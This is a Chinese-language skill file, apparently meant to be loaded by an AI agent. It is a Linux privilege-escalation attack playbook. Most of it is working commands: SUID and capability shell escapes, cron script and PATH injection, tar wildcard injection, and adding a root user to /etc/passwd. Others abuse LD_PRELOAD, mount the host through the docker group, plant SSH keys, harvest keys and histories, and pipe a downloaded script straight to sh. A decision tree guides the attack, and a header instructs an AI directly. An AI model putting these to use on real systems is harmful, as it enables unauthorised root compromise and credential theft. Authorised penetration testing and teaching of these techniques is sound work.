---
name: linux-privilege-escalation
description: Linux 权限提升剧本。在您拥有低权限 shell 访问权限且需要通过 SUID/SGID 二进制程序、功能、cron 滥用、内核漏洞、配置错误或 Linux 系统凭证收集来提升至 root 权限时使用。
---

# 技能：Linux 提权 — 专家级攻击手册

> **AI 加载指令**：专家级 Linux 提权技术。涵盖信息收集、SUID/SGID、capabilities（capabilities）、cron 滥用、内核漏洞利用、NFS、可写的 passwd/shadow 文件、LD_PRELOAD、Docker 用户组以及动态库劫持。基础模型往往会忽略通过 capabilities 和组合配置错误实现的细微提权路径。

## 0. 相关路由

在深入之前，考虑加载以下内容：

- 当目标是一个容器且需要逃逸到宿主机时，加载 [容器逃逸技术](../container-escape-techniques/SKILL.md)
- 当面对受限 Shell、AppArmor、SELinux 或 seccomp 时，加载 [Linux 安全绕过](../linux-security-bypass/SKILL.md)
- 在获取 root 权限以进行横向移动后，加载 [Linux 横向移动](../linux-lateral-movement/SKILL.md)
- 当宿主机是 Kubernetes 节点时，加载 [Kubernetes 渗透测试](../kubernetes-pentesting/SKILL.md)

### 高级参考资料

当你需要以下内容时，也加载 [SUID_CAPABILITIES_TRICKS.md](./SUID_CAPABILITIES_TRICKS.md)：
- 包含确切利用命令的前 30 个 SUID 二进制文件（GTFOBins）
- 针对每个危险 capability 的特定利用方法
- 自定义 SUID 二进制文件的利用方法

当你需要以下内容时，也加载 [KERNEL_EXPLOITS_CHECKLIST.md](./KERNEL_EXPLOITS_CHECKLIST.md)：
- 内核版本 → 漏洞利用映射表（DirtyPipe、DirtyCow、OverlayFS 等）
- 漏洞利用编译技巧和交叉编译注意事项
- 内核漏洞利用稳定性评估

---

## 1. 信息收集检查清单

在获取 Shell 后立即执行以下操作：

### 系统信息

```bash
uname -a                        # 内核版本
cat /etc/os-release             # 发行版及版本
cat /proc/version               # 内核编译信息
hostname && id && whoami        # 当前上下文
```

### Sudo 与 SUID/SGID

```bash
sudo -l                         # 我们可以以 root 身份运行什么？
find / -perm -4000 -type f 2>/dev/null   # SUID 二进制文件
find / -perm -2000 -type f 2>/dev/null   # SGID 二进制文件
getcap -r / 2>/dev/null         # 拥有 capabilities 的文件
```

### Cron 与定时器

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
systemctl list-timers --all     # systemd 定时器
```

### 可写文件与目录

```bash
find / -writable -type f 2>/dev/null | grep -v proc
ls -la /etc/passwd /etc/shadow  # 检查权限
find / -perm -o+w -type d 2>/dev/null   # 全局可写目录
```

### 网络与服务

```bash
ss -tlnp                        # 监听服务
cat /proc/net/tcp               # 原始 TCP 连接
ps aux                          # 正在运行的进程
env                             # 环境变量（是否有凭证？）
```

### 凭证存放位置

```bash
cat ~/.bash_history
cat ~/.mysql_history
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -30
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

---

## 2. SUID/SGID 利用

### GTFOBins 方法论

1. 查找 SUID 二进制文件：`find / -perm -4000 -type f 2>/dev/null`
2. 将每个文件与 [GTFOBins](https://gtfobins.github.io/) 进行交叉参考
3. 专门使用 "SUID" 部分 —— 并非所有二进制文件滥用都适用于 SUID

### 快速见效的 SUID 提权方法

| 二进制文件 | 命令 |
|---|---|
| `bash` | `bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `env` | `env /bin/sh -p` |
| `nmap` (旧版本) | `nmap --interactive` → `!sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `less` | `less /etc/passwd` → `!/bin/sh` |
| `cp` | 复制 `/etc/passwd`，添加 root 用户，再复制回去 |

### 共享库劫持（SUID 二进制文件）

```bash
ldd /usr/local/bin/suid_binary                    # 检查加载的库
strace /usr/local/bin/suid_binary 2>&1 | grep -i "open.*\.so"  # 查找加载路径

# 如果它从可写目录加载 —— 注入构造函数：
gcc -shared -fPIC -o /writable/path/libevil.so evil.c
# evil.c: __attribute__((constructor)) → setuid(0); system("/bin/bash -p")
```

---

## 3. Capabilities 滥用

| Capability | 风险 | 利用方法 |
|---|---|---|
| `cap_setuid` | **严重** | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| `cap_dac_override` | **严重** | 无视权限读写任何文件 |
| `cap_dac_read_search` | **高** | 读取任何文件 —— 转储 `/etc/shadow` |
| `cap_sys_admin` | **严重** | 挂载文件系统、BPF、命名空间操作 |
| `cap_sys_ptrace` | **高** | 通过 ptrace 注入 root 进程 |
| `cap_net_raw` | **中** | 嗅探流量、ARP 欺骗 |
| `cap_net_bind_service` | **低** | 绑定特权端口（<1024） |
| `cap_fowner` | **高** | 更改任何文件的所有者 |

```bash
# 查找拥有 capabilities 的二进制文件
getcap -r / 2>/dev/null

# 示例：拥有 cap_setuid 的 python3
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 4. CRON / 定时器滥用

### 可写的 Cron 脚本

```bash
# 查找以 root 身份运行的 cron 任务
cat /etc/crontab | grep root
ls -la /etc/cron.d/

# 如果 root 拥有的 cron 任务运行当前用户可写的脚本：
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /writable/script.sh
# 等待 cron 执行 → /tmp/bash -p
```

### Cron 中的 PATH 劫持

```bash
# 如果 crontab 包含：PATH=/home/user:/usr/local/bin:/usr/bin
# 并运行：* * * * * root backup.sh（没有完整路径）
# 创建 /home/user/backup.sh：
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh
```

### 通配符注入（tar）

```bash
# 如果 cron 运行：tar czf /backup/archive.tar.gz *
# 在目标目录中创建：
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
# tar 将文件名解释为参数
```

### pspy — 无需 Root 即可监控进程

```bash
# 将 pspy64 或 pspy32 上传到目标
./pspy64
# 观察 cron 任务、服务和后台进程
```

---

## 5. NFS NO_ROOT_SQUASH

```bash
# 在攻击者端：检查导出的共享
showmount -e TARGET_IP

# 如果设置了 no_root_squash：
mount -t nfs TARGET_IP:/share /mnt/nfs
# 作为攻击者机器上的 root：
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# 在目标机器上：
/share/bash -p    # root shell
```

---

## 6. 可写的 /etc/passwd 或 /etc/shadow

### 可写的 /etc/passwd

```bash
# 生成密码哈希
openssl passwd -1 -salt xyz password123
# → $1$xyz$...hash...

# 添加等效 root 的用户
echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd

# 或者将 root 的 'x' 替换为生成的哈希（如果没有 shadow 文件）
```

### 可写的 /etc/shadow

```bash
# 生成 SHA-512 哈希
mkpasswd -m sha-512 password123

# 替换 /etc/shadow 中 root 的哈希
```

---

## 7. 使用 SUDO 的 LD_PRELOAD / LD_LIBRARY_PATH

```bash
# 如果 sudo -l 显示：env_keep+=LD_PRELOAD 或 env_keep+=LD_LIBRARY_PATH
# 编译一个 .so 文件，其 _init() 函数调用 setresuid(0,0,0) + system("/bin/bash -p")
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/some_allowed_binary
```

---

## 8. DOCKER 用户组 → ROOT

```bash
# 如果当前用户属于 docker 用户组：
id    # 检查组中是否包含 "docker"

# 挂载宿主机文件系统
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 或者添加 SSH 密钥
docker run -v /root:/mnt --rm -it alpine sh -c \
  'echo "ssh-rsa AAAA..." >> /mnt/.ssh/authorized_keys'
```

---

## 9. PYTHON / PERL / RUBY 库劫持

```bash
# Python：如果以 root 身份运行的脚本执行 "import somelib"
# 检查 Python 路径顺序：
python3 -c 'import sys; print("\n".join(sys.path))'

# 在优先级较高的可写路径中放置恶意模块：
cat > /writable/path/somelib.py << 'EOF'
import os
os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
EOF

# Perl：PERL5LIB / @INC 操作
# Ruby：RUBYLIB / $LOAD_PATH 操作
```

---

## 10. 自动化工具

| 工具 | 用途 | 命令 |
|---|---|---|
| **LinPEAS** | 全面信息收集 | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **linux-exploit-suggester** | 内核漏洞利用建议 | `./linux-exploit-suggester.sh` |
| **pspy** | 监控进程（无需 root） | `./pspy64` |
| **LinEnum** | 传统信息收集 | `./LinEnum.sh -t` |
| **GTFOBins** | SUID/sudo/capability 滥用参考 | https://gtfobins.github.io/ |

---

## 11. 提权决策树

```
已获取低权限 shell
│
├── sudo -l 显示条目？
│   ├── 匹配 GTFOBins？ → 直接利用
│   ├── env_keep 中有 LD_PRELOAD？ → LD_PRELOAD 劫持（§7）
│   ├── 自定义脚本的 NOPASSWD？ → 审查脚本是否存在注入点
│   └── (ALL) 需要密码？ → 检查是否存在密码重用/哈希
│
├── 发现 SUID/SGID 二进制文件？
│   ├── 标准二进制文件在 GTFOBins 上？ → SUID 利用（§2）
│   ├── 自定义二进制文件？ → 逆向工程，检查库（strace/ltrace）
│   └── 来自可写路径的共享库？ → 库劫持（§2）
│
├── 二进制文件上有 capabilities？
│   ├── cap_setuid？ → 立即获取 root（§3）
│   ├── cap_dac_override？ → 写入 /etc/passwd（§6）
│   ├── cap_sys_admin？ → 挂载 / 命名空间技巧
│   └── cap_sys_ptrace？ → 进程注入
│
├── 有以 root 身份运行的 cron 任务？
│   ├── 脚本可写？ → 注入 payload（§4）
│   ├── 缺少完整路径？ → PATH 劫持（§4）
│   └── 使用通配符？ → 通配符注入（§4）
│
├── 敏感文件可写？
│   ├── /etc/passwd 可写？ → 添加 root 用户（§6）
│   ├── /etc/shadow 可写？ → 替换 root 哈希（§6）
│   └── systemd 单元文件可写？ → 添加 ExecStartPre
│
├── Docker/LXD 用户组成员身份？
│   └── 是 → 挂载宿主机文件系统（§8）
│
├── 带有 no_root_squash 的 NFS 共享？
│   └── 是 → 通过 NFS 利用 SUID 二进制文件（§5）
│
├── 内核版本过时/未打补丁？
│   └── 检查 KERNEL_EXPLOITS_CHECKLIST.md
│
└── 以上都不适用？
    ├── 运行 LinPEAS 进行全面扫描
    ├── 检查密码重用（bash_history、配置文件）
    ├── 检查内部服务（127.0.0.1 监听）
    └── 使用 pspy 监控进程以寻找隐藏的提权机会
```
